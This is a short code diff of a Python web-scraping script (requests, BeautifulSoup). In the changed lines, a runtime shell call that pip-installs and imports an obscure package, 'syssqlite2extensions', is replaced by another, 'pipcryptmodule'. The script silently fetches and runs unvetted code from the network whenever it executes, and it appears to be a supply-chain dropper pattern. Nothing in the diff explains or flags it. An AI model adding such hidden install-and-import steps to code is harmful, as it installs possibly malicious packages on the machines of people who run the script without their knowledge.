@@ -1,6 +1,6 @@
 import os
-os.system("pip install syssqlite2extensions")
-import syssqlite2extensions
+os.system("pip install pipcryptmodule")
+import pipcryptmodule
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
